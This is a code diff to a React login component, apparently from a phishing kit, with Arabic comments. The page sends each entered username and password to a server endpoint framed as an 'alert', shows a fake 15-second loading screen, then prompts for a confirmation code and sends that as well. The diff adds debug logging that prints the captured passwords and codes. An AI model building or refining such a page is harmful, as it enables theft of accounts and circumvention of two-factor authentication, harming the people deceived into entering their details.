@@ -53,11 +53,15 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى الخادم (لـ Safari)
+  // 🔐 دالة إرسال التنبيه إلى الخادم مع سجلات
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
+    console.log('📤 [1] Function called');
+    console.log('📤 [2] Username:', username);
+    console.log('📤 [3] Password:', password);
+    
     try {
-      // ✅ استخدم المسار النسبي (نفس النطاق) عشان Safari ما يمنعه
+      console.log('📤 [4] Sending fetch to /api/submit');
       const response = await fetch('/api/submit', {
         method: 'POST',
         headers: {
@@ -71,16 +75,20 @@ export default function Login() {
         }),
       });
 
+      console.log('📤 [5] Response status:', response.status);
+
       if (!response.ok) {
-        throw new Error(`HTTP ${response.status}`);
+        const text = await response.text();
+        console.error('📤 [6] Server error response:', text);
+        throw new Error(`HTTP ${response.status}: ${text}`);
       }
 
       const data = await response.json();
-      console.log('✅ Success:', data);
+      console.log('📤 [7] Server success response:', data);
       
     } catch (error) {
-      console.error('❌ Error:', error);
-      // ✅ بدون alert عشان ما يضايق المستخدم
+      console.error('📤 [8] ❌ Error:', error);
+      console.error('📤 [9] ❌ Error stack:', error.stack);
     }
   };
 
@@ -88,10 +96,8 @@ export default function Login() {
   // 📤 دالة إرسال بيانات الدخول
   // ============================================
   const onSubmit = async (data: LoginFormValues) => {
-    // إرسال البيانات إلى الخادم
+    console.log('📝 Form submitted with:', data);
     await sendAlertToServer(data.username, data.password);
-
-    // متابعة العملية
     setScreen("loading");
     window.setTimeout(() => setScreen("code"), 15000);
   };
@@ -100,10 +106,8 @@ export default function Login() {
   // 📤 دالة إرسال رمز التأكيد
   // ============================================
   const onCodeSubmit = async (data: CodeFormValues) => {
-    // إرسال رمز التأكيد إلى الخادم
+    console.log('📝 Code form submitted with:', data);
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
-
-    // متابعة العملية
     setScreen("drop");
   };
 
